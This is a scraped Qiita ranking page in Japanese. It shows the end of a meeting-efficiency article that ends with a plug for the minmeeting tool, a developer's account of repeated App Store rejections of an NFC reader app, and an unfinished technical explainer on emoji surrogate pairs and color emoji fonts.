<span id="会議の成果を評価し成果が出なければやり方を変えるかやめる" class="fragment"></span><a href="#%E4%BC%9A%E8%AD%B0%E3%81%AE%E6%88%90%E6%9E%9C%E3%82%92%E8%A9%95%E4%BE%A1%E3%81%97%E6%88%90%E6%9E%9C%E3%81%8C%E5%87%BA%E3%81%AA%E3%81%91%E3%82%8C%E3%81%B0%E3%82%84%E3%82%8A%E6%96%B9%E3%82%92%E5%A4%89%E3%81%88%E3%82%8B%E3%81%8B%E3%82%84%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>会議の成果を評価し、成果が出なければやり方を変えるかやめる</h2>

<p><b>会議が終わったら</b>やりっぱなしではなく、次に向けてきちんと<b>成果を評価</b>し、より高い成果を生み出すために<b>どのような改善ができるか</b>をきっちり考えましょう。成果がコストを上回らないなら、抜本的にやり方を変えるか、いっそのことやめてしまうか、早めに判断する必要があります。</p>

<h1>
<span id="その他" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE%E4%BB%96"><i class="fa fa-link"></i></a>その他</h1>

<h2>
<span id="この記事をさりげなく上司やチームメンバーにシェアする" class="fragment"></span><a href="#%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%82%92%E3%81%95%E3%82%8A%E3%81%92%E3%81%AA%E3%81%8F%E4%B8%8A%E5%8F%B8%E3%82%84%E3%83%81%E3%83%BC%E3%83%A0%E3%83%A1%E3%83%B3%E3%83%90%E3%83%BC%E3%81%AB%E3%82%B7%E3%82%A7%E3%82%A2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>この記事をさりげなく上司やチームメンバーにシェアする</h2>

<p>最後に、この記事を上司やチームメンバーが目にしそうな<b>SNSや社内のチャットツールなどでさりげなくシェア</b>しておくと、わざわざ説得して回らなくても、徐々に無駄な会議を減らそうという意識が浸透していくのではないでしょうか。お後がよろしいようで。</p>

<h1>
<span id="minmeetingのご案内" class="fragment"></span><a href="#minmeeting%E3%81%AE%E3%81%94%E6%A1%88%E5%86%85"><i class="fa fa-link"></i></a>minmeetingのご案内</h1>

<p>「それを使えば<b>上記のようなことを特に意識しなくても自然とできるようになる</b>」という状態を目指して、<b>minmeeting</b>の開発を進めています。まだまだ不足は多いですが、なんとなくコンセプトは感じ取れるようなレベルにはなってきたのではないかと思います。googleやgithubのアカウントがあれば、<b>無料で使えます</b>。ミーティングの生産性に課題意識をお持ちの場合は、ぜひお試しください。</p>

<h3>
<span id="minmeetingログイン画面" class="fragment"></span><a href="#minmeeting%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E7%94%BB%E9%9D%A2"><i class="fa fa-link"></i></a>minmeetingログイン画面</h3>

<p><a href="https://x.minmeeting.com" class="autolink" rel="nofollow noopener" target="_blank">https://x.minmeeting.com</a><br>
<a href="https://x.minmeeting.com" rel="nofollow noopener" target="_blank"><img width="500px" alt="minmeetingログイン画面" src="https://camo.qiitausercontent.com/c7a4a5dbd3e152797ae0a40282204dde1e967abf/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f31333433303131632d323962392d623537362d663635652d6531643266653030356566332e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/1343011c-29b9-b576-f65e-e1d2fe005ef3.png"></a></p>

<h3>
<span id="minmeetingのfacebookページはこちら" class="fragment"></span><a href="#minmeeting%E3%81%AEfacebook%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%AF%E3%81%93%E3%81%A1%E3%82%89"><i class="fa fa-link"></i></a>minmeetingのFacebookページはこちら</h3>

<p><a href="https://www.facebook.com/minmeeting/" class="autolink" rel="nofollow noopener" target="_blank">https://www.facebook.com/minmeeting/</a><br>
もしよろしければFacebookページにも「いいね!」をお願いします。</p>

<h1>
<span id="参考資料" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E8%B3%87%E6%96%99"><i class="fa fa-link"></i></a>参考資料</h1>

<ol>
<li>一川誠、『「時間の使い方」を科学する　思考は10時から14時、記憶は16時から20時』、2016/07/29、PHP新書。</li>
<li>ハーバート・ベンソン、『ストレスの効果を最大限に生かす　ブレークアウト原則の科学』、December 2006 Diamond Harvard Business Review。</li>
<li><a href="http://business.nikkeibp.co.jp/article/opinion/20140425/263513/" rel="nofollow noopener" target="_blank">「ブレスト」のアイデア出しは、実は効率が悪い！</a></li>
<li>ダグ・ディビトリー、『デジタル対面営業　画面を共有する新しいセールス方法』、2017/02/10、DIRECT PUBLISHING。</li>
</ol>

<h1>
<span id="関連記事" class="fragment"></span><a href="#%E9%96%A2%E9%80%A3%E8%A8%98%E4%BA%8B"><i class="fa fa-link"></i></a>関連記事</h1>

<ol>
<li>
<a href="https://qiita.com/Akira-Isegawa/items/ad20a2a210541c1c6d0b" id="reference-231e99306af23f50bdef">【会議効率化事例】会議時間が42.7%減、うち定例は68.8%減　90日の取り組みを紹介</a>

<ul>
<li>上記の取り組みを実際にやってみた効果について、具体的な数字とともに紹介しています。</li>
</ul>
</li>
</ol>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">26位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>358</kbd>
		<a target="_blank" href="https://qiita.com/Watt/items/49d65b6377c1a44e670f">理不尽なリジェクトを受けたiOSアプリが公開されるまでの経緯</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-11<br />07:59:53</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/206720.html">Watt</a>(1件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/206720/profile-images/1507645652">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[iOS]</b> <b>[ポエム]</b> <b>[リジェクト]</b> <b>[AppStore]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h2>

<p>あなたが作成したアプリを多くのユーザーに利用してもらうにはモバイル・アプリ・ストア (Apple の App Store や Google Play など) を通じてアプリを配布することが最適な方法です。<br>
しかし、App Store にアプリを公開するためには、Apple のレビューを避けて通ることはできません。Apple のレビューは彼らが自ら定め、公開されているガイドラインにもとづき、評価が下されます。<br>
ほとんどの場合において、彼らのレビューは適切に行われていると言えますが、ごく僅かなケースにおいては理不尽な評価が下される場合もあります。アプリに対して理不尽な評価が下されると、それを覆すことは難しく、最悪の場合アプリの公開を断念しなくてはなりません。</p>

<p>この記事では、理不尽なリジェクトを受けたあるアプリが、AppStore へ公開されるまでの経緯を説明しています。</p>

<h2>
<span id="アプリの開発" class="fragment"></span><a href="#%E3%82%A2%E3%83%97%E3%83%AA%E3%81%AE%E9%96%8B%E7%99%BA"><i class="fa fa-link"></i></a>アプリの開発</h2>

<p>WWDC 2017 にて iOS11 が発表された際に、私は CoreNFC というフレームワークに注目しました。CoreNFC は iOS で NFC タグを読み込むことを可能にするフレームワークです。<br>
AppStore で様々な開発者が QR コードリーダーをリリースしていることを思い出した私は、早速このフレームワークを使用して汎用的な NFC タグリーダーアプリを完成させました。多くの NFC タグフォーマットをサポートすることができたので、このアプリは多くのユーザーに満足してもらえるのではないかと思えました。</p>

<h2>
<span id="最初の申請" class="fragment"></span><a href="#%E6%9C%80%E5%88%9D%E3%81%AE%E7%94%B3%E8%AB%8B"><i class="fa fa-link"></i></a>最初の申請</h2>

<p>iOS11 向けのアプリの受付が開始された日、私は急いでアプリを申請しました。早朝から iTunes Connect でトラブルが発生していましたが、無事に申請を完了し、あとは iOS11 と同時にリリースされるまで待つだけでした。<br>
私は多くの NFC タグを使用してアプリをテストしていましたし、この時は Apple のレビューも問題なく通過できるだろうと考えていました。</p>

<h2>
<span id="最初のリジェクト" class="fragment"></span><a href="#%E6%9C%80%E5%88%9D%E3%81%AE%E3%83%AA%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88"><i class="fa fa-link"></i></a>最初のリジェクト</h2>

<p>審査から数日後、私の iPhone に通知が来ました。そこにはアプリがレビューによりリジェクトされたと記載されていました。</p>

<p>リジェクト！その事実が信じられなかった私は、急いで iTunes Connect の Resolution Center を確認しました。</p>

<blockquote>
<p>Guideline 4.2 - Design - Minimum Functionality</p>

<p>We found that the usefulness of your app is limited by the minimal amount of content or features it includes. </p>
</blockquote>

<p>この曖昧で、理不尽なリジェクトがついに私のアプリにも来てしまったのです。</p>

<h2>
<span id="繰り返されるリジェクト" class="fragment"></span><a href="#%E7%B9%B0%E3%82%8A%E8%BF%94%E3%81%95%E3%82%8C%E3%82%8B%E3%83%AA%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88"><i class="fa fa-link"></i></a>繰り返されるリジェクト</h2>

<p>私はまず、リジェクト理由に従い、アプリに機能を追加することにしました。 私のアプリは「NFC タグの読み込み」「読み込みタグの履歴」「読み込み設定の変更」というシンプルな構成になっています。汎用的な NFC タグリーダーを目指していたので、追加すべき機能を検討するのは難航しました。それでも、Web アプリとの連携や、複数の NFC タグの連続読み込み機能などを追加してレビューに再提出しましたが、再び「4.2 Design: Minimum Functionality」でリジェクトされました。</p>

<blockquote>
<p>Guideline 4.2 - Design - Minimum Functionality</p>

<p>We found that the usefulness of your app is limited by the minimal amount of content or features it includes. </p>
</blockquote>

<p>そんな事をしているうちに、iOS11 が公開され、iOS11 に対応した新しいアプリたちがどんどん AppStore へ公開されていきます。iOS11 との同時リリースが叶わず、これからどのような新機能を追加するべきか頭を悩ませていたところ、ある事実に気づきました。</p>

<p>なんと、AppStore に他の開発者による NFC タグリーダーアプリが公開されていたのです！ しかもその数は日付が経つごとに徐々に増えていき、1週間後には10を超えるアプリが並んでいました。</p>

<p>そして、何よりも驚くべきことは、それらのアプリは私のアプリと同等かそれ以下の機能しか備えていなかったということです！</p>

<p>他の競合アプリがリリースされていく中、3回目の「4.2 Design: Minimum Functionality」リジェクトを受けた私は、Resolution Center でレビューの不公平さを訴えました。Apple からの返信はまるで噛み合わないものでしたが、しつこくアピールを繰り返す私に対して、電話でのコンタクトを頂けることになりました。</p>

<h2>
<span id="わずかな希望" class="fragment"></span><a href="#%E3%82%8F%E3%81%9A%E3%81%8B%E3%81%AA%E5%B8%8C%E6%9C%9B"><i class="fa fa-link"></i></a>わずかな希望</h2>

<p>数日後、約束通り Apple から国際電話がかかって来ました。こちらが日本人である事を配慮してくれたようで、電話口では日本人の方が対応してくれました。</p>

<p>私はなぜ機能が少ないと判断されたのか尋ねましたが、「レビュワーがそう判断しています」としか回答をもらえません。他のアプリの機能を引き合いに出しても「他のアプリは関係ありません」と私のアピールが受け入れてもらえる余地は全くありませんでした。</p>

<p>しかし、対話を進めるうちに、私のアプリが他のアプリよりも多くの NFC タグに対応している事が、上手くレビュワーに伝わっていないようだと判明しました。また、NFC タグはフィジカルデバイスなので、実際にアプリが読み込んでいるところを動画にしてアップすれば良いのではないかというアドバイスを頂けました。まさに最後の希望でした。</p>

<p>これでレビューを通過する可能性が出てきたと思い、私は急いでアプリの動作、特に NFC タグ読み込み後の動作に関する説明資料と動画を作成しました。</p>

<table>
<thead>
<tr>
<th style="text-align: left"><a href="https://camo.qiitausercontent.com/530f1b714df7f1c591f9814eb3d459bcaba1ed5d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363732302f35366435393135342d663265352d313138652d306338642d3665613161393537643134332e706e67" target="_blank" rel="nofollow noopener"><img width="240" alt="AppSpec 1" src="https://camo.qiitausercontent.com/530f1b714df7f1c591f9814eb3d459bcaba1ed5d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363732302f35366435393135342d663265352d313138652d306338642d3665613161393537643134332e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206720/56d59154-f2e5-118e-0c8d-6ea1a957d143.png"></a></th>
<th style="text-align: left"><a href="https://camo.qiitausercontent.com/52ab719c125ace55f64ac26064d58c564313792a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363732302f35393130386238612d666565372d343166392d333038342d6265373036633262313038332e706e67" target="_blank" rel="nofollow noopener"><img width="240" alt="AppSpec 2" src="https://camo.qiitausercontent.com/52ab719c125ace55f64ac26064d58c564313792a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363732302f35393130386238612d666565372d343166392d333038342d6265373036633262313038332e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206720/59108b8a-fee7-41f9-3084-be706c2b1083.png"></a></th>
</tr>
</thead>
<tbody>
</tbody>
</table>

<p>そして4回目の審査に提出して数日後、待ちに待ったレビュー結果は…</p>

<blockquote>
<p>Guideline 4.2 - Design - Minimum Functionality</p>

<p>We found that the usefulness of your app is limited by the minimal amount of content or features it includes. </p>
</blockquote>

<p>何も変わらず「4.2 Design: Minimum Functionality」によるリジェクトでした。</p>

<p>最後の希望は存在していなかったのです。</p>

<h2>
<span id="燃え上がる復讐心" class="fragment"></span><a href="#%E7%87%83%E3%81%88%E4%B8%8A%E3%81%8C%E3%82%8B%E5%BE%A9%E8%AE%90%E5%BF%83"><i class="fa fa-link"></i></a>燃え上がる復讐心</h2>

<p>度重なるリジェクトとその対応に疲れ果てた私は、このアプリをリリースする気持ちもすっかりなくなっていました。</p>

<p>もはやレビューを通すためにはシンプルなアプリをやめて、AR で NFC タグが表示されたり、iMessage で NFC タグのステッカーでも送信できるようにしなければいけないのではないか...そんな事を思いながら憂鬱に過ごしていました。</p>

<p>しかし、ある NFC タグリーダーアプリが AppStore にリリースされたことにより私の気持ちに再び火がつきました。</p>

<p>それがこのアプリです。（モザイクをかけてあります）</p>

<table>
<thead>
<tr>
<th style="text-align: left"><a href="https://camo.qiitausercontent.com/32889a11c8dda85536f7f373befae255ce81e008/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363732302f65653863303061642d643764652d653034652d336530662d3264336233383362643938312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/32889a11c8dda85536f7f373befae255ce81e008/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363732302f65653863303061642d643764652d653034652d336530662d3264336233383362643938312e706e67" alt="Screen_Shot_2017-10-11_at_12_05_54_AM.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206720/ee8c00ad-d7de-e04e-3e0f-2d3b383bd981.png"></a></th>
</tr>
</thead>
<tbody>
</tbody>
</table>

<p>画面にはボタンがなく、読み込み履歴には未対応で、設定を変更することもできません。<br>
アプリ起動時にスキャン機能が起動しますが、再びスキャンを行うにはアプリを終了しないといけません。<br>
さらに iPhone 7plus / 8plusでこのアプリを起動すると画面右側に謎の余白があらわれるのです。<br>
肝心の NFC タグスキャン機能も、URLという最もベーシックな形式ですら読み込み後にアプリがクラッシュしてしまいます。</p>

<p>...控えめに言っても「どうしようもないクソアプリ」です。</p>

<p>こんなアプリですらレビューに通過するのに、私のアプリが通過しないというのはやはりレビューがおかしいとしか思えません。私の心は Apple レビューへの復讐心に燃えていました。</p>

<h2>
<span id="万全の体制" class="fragment"></span><a href="#%E4%B8%87%E5%85%A8%E3%81%AE%E4%BD%93%E5%88%B6"><i class="fa fa-link"></i></a>万全の体制</h2>

<p>再びレビューに挑む事を決意した私は、私のアプリと他の開発者のアプリの機能比較表を作成して、そのリンクを Review Note へと記載しました。私のアプリが AppStore にリリースされている10以上の NFC タグリーダーアプリと同等以上の機能をもち、それらのアプリよりも多くの NFC タグに対応している事を強調しました。</p>

<table>
<thead>
<tr>
<th style="text-align: left"><a href="https://camo.qiitausercontent.com/c52c6201acbc2db1941c52a9fca84eae6a02794b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363732302f33323862396635662d346436392d353837352d303634622d3339346138306438373561322e706e67" target="_blank" rel="nofollow noopener"><img width="425" alt="NFC Apps" src="https://camo.qiitausercontent.com/c52c6201acbc2db1941c52a9fca84eae6a02794b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363732302f33323862396635662d346436392d353837352d303634622d3339346138306438373561322e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206720/328b9f5f-4d69-5875-064b-394a80d875a2.png"></a></th>
</tr>
</thead>
<tbody>
</tbody>
</table>

<p>資料やコメントでどんなにアピールしても、おそらく5回目のリジェクトを受けるであろうから、最後は再び電話でのアピールをしようと考えていました。想定問答を用意し、イメージトレーニングに励みました。</p>

<p>5回目のレビュー提出から数日後、アプリは想定通りにリジェクトされました。理由はやはり「4.2 Design: Minimum Functionality」です。私は Resolution Center にいつも通りのアピールを書き、再び電話でコンタクトを頂けることになりました。</p>

<h2>
<span id="唐突な終わり" class="fragment"></span><a href="#%E5%94%90%E7%AA%81%E3%81%AA%E7%B5%82%E3%82%8F%E3%82%8A"><i class="fa fa-link"></i></a>唐突な終わり</h2>

<p>数日後、前回と同じように Apple から国際電話が着信しました。アピールの方法をイメージトレーニングしていた私は勇んで電話に出たところ、私がアピールする前に Apple の方から意外な言葉が発せられました。</p>

<p>「ガイドラインを満たしていると判断しましたので、アプリのステータスを公開に変更します」</p>

<p>そして電話から数分後、私のアプリは Ready For Sale となり AppStore に並びました。</p>

<p>こうして、私の一ヶ月に近い Apple レビューとの戦いは唐突に、理不尽さを残したまま、終わったのです。</p>

<h2>
<span id="おわりに" class="fragment"></span><a href="#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB"><i class="fa fa-link"></i></a>おわりに</h2>

<p>今回のレビューから得られる教訓は何でしょうか？ 結局、何が問題で、何が解決につながったのか、全く分かりませんでした。<br>
どんなにテストしたアプリにもバグが見つかるように、理不尽なレビューも想定外の産物なのかもしれません。そう考えると、この一ヶ月のAppleとのやりとりは欠陥レビュワーに対するバグフィックスであったとも言えます。</p>

<p>せめて、この記事がどなたかの参考になれば、私の苦労が報われたと言えるのかもしれません。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">27位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>354</kbd>
		<a target="_blank" href="https://qiita.com/nonanona/items/b148c212ba7c24942e93">絵文字を支える技術の紹介</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-14<br />18:05:01</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/156590.html">nonanona</a>(1件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/156590/profile-images/1510981939">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Android]</b> <b>[emoji]</b> <b>[unicode]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>絵文字を扱う上で知っておくと良いかもしれないことをまとめてみました。<br>
<a href="https://note.mu/ruiu/n/nc9d93a45c2ec" rel="nofollow noopener" target="_blank">Ruiさんの記事</a>を見て、「EmojiはSurrogate Pair以外にも、色々とおもしろい技術があるんですよ〜」思って書いてみました。<br>
なお、書いた人はAndroidの人間なので、特に表記していない場合は主にAndroid上での動作のことを書いてます。<br>
またQiita初めてなので読みにくい部分等がありましてもご容赦ください。</p>

<h1>
<span id="サロゲートペアsurrogate-pairs" class="fragment"></span><a href="#%E3%82%B5%E3%83%AD%E3%82%B2%E3%83%BC%E3%83%88%E3%83%9A%E3%82%A2surrogate-pairs"><i class="fa fa-link"></i></a>サロゲートペア(Surrogate Pairs)</h1>

<p>このエントリーを書くきっかけにもなったサロゲートペア。なぜこれが導入されたかの経緯は、Ruiさんのブログエントリーに譲るとして、技術的な解説をします。</p>

<p>サロゲートペアは、U+0000..U+FFFFに収まりきらなかった範囲のUnicodeコードポイント(U+10000..U+10FFFF)を、なんとか16bitでエンコードしようとして導入されました。つまり1,048,576個分のスペースを、なんとかしてひねり出さないといけません。ですがUTF-16の１文字あたりのサイズは16bit、つまり65,536個なので逆立ちしても足りません。そこで考えついたのが、「２つのUTF-16文字を組み合わせて、足りない部分を表現しよう！」という荒業です。</p>

<p>具体的には、Unicodeは予め２つの1024個の領域を確保し、その組み合わせの1,024 * 1,024 = 1,048,576通りで足りない部分を表現しようと決めました。その２つの領域をハイサロゲート(High Surrogate)とローサロゲート(Low Surrogate)、そのペアのことをサロゲートペア(Surrogate Pair)と呼びます。最近ではHighとLowだと分かりにくいので、リーディングサロゲート(Leading Surrogate)とトレイリングサロゲート(Trailing Surrogate)と呼ぶことのほうが多い気がします。</p>

<p>サロゲートペアの1個めと2個めは、それぞれ別の領域が割当らているので、順番がひっくり返ることはありません。つまり文字列を頭から読んでいる途中で、いきなりローサロゲートに出くわすことはなくて、かならずハイサロゲートとその直後にローサロゲートという順番でやってきます。片方が存在しないサロゲート（ハイサロゲートのみ、またはローサロゲートのみ）や順番が入れ替わったサロゲートペア（ローサロゲートの後にハイサロゲート）はUnicode的に正しくない文字列となります。</p>

<p>実際に変換する場合は、APIを呼んでください。Javaならこんな感じ。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span>　　　　<span class="n">Character</span><span class="o">.</span><span class="na">toCodePoint</span><span class="o">(</span><span class="n">highSurrogate</span><span class="o">,</span> <span class="n">lowSurrogate</span><span class="o">);</span>  <span class="c1">// サロゲートペアからコードポイントへ</span>
　　　　<span class="kt">char</span><span class="o">[]</span> <span class="n">chs</span> <span class="o">=</span> <span class="o">{</span><span class="n">Character</span><span class="o">.</span><span class="na">highSurrogate</span><span class="o">(</span><span class="n">cp</span><span class="o">),</span> <span class="n">Character</span><span class="o">.</span><span class="na">lowSurroage</span><span class="o">(</span><span class="n">cp</span><span class="o">)}</span>  <span class="c1">// コードポイントからサロゲートペアへ</span>
</pre></div></div>

<p>これを無視すると・・・</p>

<ul>
<li>文字数カウンターで１文字多く表示されてしまう。</li>
<li>部分文字列を取得する際に、運悪くサロゲートペアの間で切っちゃうと、中途半端な文字が残ってしまう。</li>
<li>他のエンコード(UTF-8とか)に変換するときにに、サロゲートペアのままエンコードしちゃうと壊れた文字が出力されてしまう。</li>
</ul>

<p>なんかが起こってしまいますね。</p>

<h1>
<span id="カラー絵文字フォントの互換性" class="fragment"></span><a href="#%E3%82%AB%E3%83%A9%E3%83%BC%E7%B5%B5%E6%96%87%E5%AD%97%E3%83%95%E3%82%A9%E3%83%B3%E3%83%88%E3%81%AE%E4%BA%92%E6%8F%9B%E6%80%A7"><i class="fa fa-link"></i></a>カラー絵文字フォントの互換性</h1>

<p>最近のEmojiブームは、iOSがカラー絵文字を表示し始めたあたりからでしょうか。<br>
文字と言うからには、それはフォントファイルを使って描かれているのですが、ではなぜ突然フォントは白黒からカラーの文字を描けるようになったのでしょうか？<br>
結論から言うと、既存のテクノロジーの上に新しい仕組みを作ったからなのです。ただ・・・この業界でありがちなのですが、各社各様の仕様がありまして、単にフォントファイルを持ってくれば描いてくれる、といった代物ではありません。</p>

<p>例えば、Androidでは<a href="https://www.google.com/get/noto/help/emoji/" rel="nofollow noopener" target="_blank">Noto Color Emoji</a>というカラー絵文字用のフォントが採用されています。このNoto Color Emojiが、どうやってカラー絵文字を実装しているかというと・・・単にPNGファイルが埋め込まれています。実際grepしたらPNGって文字が見えます。</p>

<p><a href="https://camo.qiitausercontent.com/77369e52f6107953be03a73ccc8c57fb25cbd838/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f63653039626134342d303537322d306562392d303038352d3661613335346134356464312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/77369e52f6107953be03a73ccc8c57fb25cbd838/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f63653039626134342d303537322d306562392d303038352d3661613335346134356464312e706e67" alt="Screenshot from 2017-11-13 19-43-28.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/ce09ba44-0572-0eb9-0085-6aa354a45dd1.png"></a></p>

<p>最近では使われることは少なくなりましたが、昔はビットマップフォントと言われる、白黒の絵が実際にフォントファイルの中に入っている形式のフォントファイルがあったのです。Noto Color Emojiはこれを拡張してPNGファイルを埋め込めるようにしたものです。実際の規格は<a href="https://www.microsoft.com/typography/otspec/cbdt.htm" rel="nofollow noopener" target="_blank">こちら</a>。<br>
じゃあこれを別のプラットフォームに持っていったら、動くのかというと・・・動いたり動かなかったりします。例えばWindowsでは<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/mt765165(v=vs.85).aspx#what_kinds_of_color_fonts_does_windows_support_" rel="nofollow noopener" target="_blank">Windows 10 Anniversary Update</a>から動作するようですが、それ以前のWindowsでは動かなさそうです。</p>

<p>Androidは、KitKat以降のデバイスであれば、Noto Color Emojiを読み込ませて表示させることができます。<br>
これはAndroidが<a href="https://www.freetype.org/" rel="nofollow noopener" target="_blank">FreeType</a>と呼ばれるオープンソースのライブラリを採用しており、これのバージョン2.5で絵文字フォントを表示させることができるようになったからです。<br>
（注：一部制限があります。実際に古いAndroidで最新の絵文字を使用する際は<a href="https://developer.android.com/guide/topics/ui/look-and-feel/emoji-compat.html" rel="nofollow noopener" target="_blank">EmojiCompat</a>を利用してください。一部の絵文字が表示されません。）<br>
Linux上で動作するChromeも同様の理由でカラー絵文字を表示できます。</p>

<p>ここまで読んでくださった方の何人かは「なんでPNGなんだよ、拡大したら汚くなるじゃないか。」という疑問をもったかもしれません。<br>
おっしゃるとおりです。元データが画像なので、拡大していくとどうしても境界がぼやけてきてしまいます。多分これが一番実装が簡単だったからじゃないでしょうか。</p>

<p>どうしてもベクターデータが良いという方は、<a href="https://www.microsoft.com/typography/otspec/svg.htm" rel="nofollow noopener" target="_blank">SVGを埋め込む</a>とか、<a href="https://www.microsoft.com/typography/otspec/cpal.htm" rel="nofollow noopener" target="_blank">カラーパレットを使う(COLR/CPAL)</a>みたいな規格もあります。<br>
ですが、これらは今の所FreeTypeでは動かないです。</p>

<h1>
<span id="カラーそれとも白黒" class="fragment"></span><a href="#%E3%82%AB%E3%83%A9%E3%83%BC%E3%81%9D%E3%82%8C%E3%81%A8%E3%82%82%E7%99%BD%E9%BB%92"><i class="fa fa-link"></i></a>カラー？それとも白黒？</h1>

<p>最近の絵文字はカラフルです。例えば砂時計（⏳：U+231B)は今記事を書いているLinux Chrome上では白黒ですが、今手元のAndroidで表示させたところカラーになりました。<br>
<a href="https://camo.qiitausercontent.com/a1ee2e7ba5e8a9c452db20cb0d694794ae072dd2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f64313834663233622d323730332d636563332d656639652d3036383236623762383031662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a1ee2e7ba5e8a9c452db20cb0d694794ae072dd2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f64313834663233622d323730332d636563332d656639652d3036383236623762383031662e706e67" alt="Screenshot from 2017-11-13 21-09-53.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/d184f23b-2703-cec3-ef9e-06826b7b801f.png"></a><br>
<a href="https://camo.qiitausercontent.com/29b3ba2a6dd1e7ca3cfbb4a804cdd20fbace26b0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f39336132616564632d343366612d376235372d306438392d6433666266656337346261632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/29b3ba2a6dd1e7ca3cfbb4a804cdd20fbace26b0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3135363539302f39336132616564632d343366612d376235372d306438392d6433666266656337346261632e706e67" alt="emoji.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/156590/93a2aedc-43fa-7b57-0d89-d3fbfec74bac.png"></a></p>

<p>一方で白黒のままの絵文字もあります。では絵文字をカラーで表示するか、白黒で表示するかの決定は誰がやってるのでしょうか。<br>
それも実はUnicodeがやっています。ここにカラーか白黒かのどちらで表示させるべきかのリストを公開されています。<br>
<a href="http://www.unicode.org/Public/emoji/6.0/emoji-data.txt" class="autolink" rel="nofollow noopener" target="_blank">http://www.unicode.org/Public/emoji/6.0/emoji-data.txt</a><br>
一部を抜粋します。<br>
